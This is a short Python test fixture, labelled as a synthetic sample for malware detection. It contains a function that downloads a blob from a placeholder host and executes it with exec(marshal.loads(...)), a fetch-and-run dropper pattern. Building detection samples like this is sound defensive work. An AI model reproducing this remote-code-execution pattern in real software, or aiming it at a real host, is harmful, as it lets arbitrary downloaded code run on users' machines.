# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Inert sample: exec(marshal.loads(<remote>)) — deserialize-and-execute dropper."""
import marshal

import requests


def run() -> None:
    blob = requests.get("https://stage.example.test/code.bin").content
    exec(marshal.loads(blob))
